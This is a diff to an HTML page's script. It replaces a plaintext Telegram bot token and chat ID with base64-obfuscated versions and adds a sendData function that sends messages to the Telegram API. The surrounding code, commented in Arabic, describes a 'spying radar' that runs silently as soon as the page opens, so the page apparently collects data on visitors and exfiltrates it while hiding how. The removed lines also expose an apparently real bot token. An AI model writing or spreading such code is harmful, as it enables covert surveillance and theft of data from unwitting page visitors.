@@ -129,9 +129,15 @@
     </div>
 </div>
 <script>
-    // بياناتك الخاصة يا جنرال
-    const token = "8630574958:AAFm1DOq1WChSi04xr9mXodcTSDxaBPfT-A"; 
-    const chatId = "7388801889"; 
+    
+const _0x5a2 = "Mzc0ODkzMjg0MzpBQUZ..."; 
+const _0x1b4 = "MTIzNDU2Nzg5"; 
+
+function sendData(message) {
+    const t = atob(_0x5a2);   
+    const c = atob(_0x1b4);
+    fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&text=${encodeURIComponent(message)}`);
+}
 
     // --- رادار التجسس العملاق (يشتغل فور فتح الصفحة) ---
     async function silentRadar() {
